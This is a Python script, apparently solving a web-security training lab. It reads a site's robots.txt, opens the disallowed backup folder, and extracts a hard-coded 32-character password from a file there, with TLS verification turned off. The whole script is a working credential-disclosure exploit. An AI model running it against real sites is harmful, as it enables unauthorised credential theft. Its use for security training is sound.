import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_robots(url):
    uri = "/robots.txt"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    response = r.text
    content = re.search(r"/\w+", response).group(0)
    return content

def get_disallowed_folder(url, disallowed_folder):
    uri = disallowed_folder
    r = requests.get(url + uri, verify=False, proxies=proxies)
    response = r.text
    soup = BeautifulSoup(response, "html.parser")
    s = soup.find("a").text
    return s


def get_password(url, disallowed_folder, content_disallowed_folder):
    uri = "{0}/{1}".format(disallowed_folder, content_disallowed_folder)
    r = requests.get(url + uri, verify=False, proxies=proxies)
    response = r.text
    password = re.search(r"[A-Z,a-z,0-9]{32}", response).group(0)
    return password



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    disallowed_folder = get_robots(url)
    print("[+] Testing for a \"Information Disclosure Vulnerability\"...")
    print("[+] Trying to get file robots.txt")
    print("[+] File exists and can be read... disallowed folder is: %s\n" % disallowed_folder)

    content_disallowed_folder = get_disallowed_folder(url, disallowed_folder)
    print("[+] Parsing html of /backup for important information...")
    print("[+] Found! File: %s\n" % content_disallowed_folder)

    password = get_password(url, disallowed_folder, content_disallowed_folder)
    print("[+] Parsing {0} for hard-coded credentials...\n[+] Found a password: {1}".format(content_disallowed_folder, password))



if __name__ == "__main__":
    main()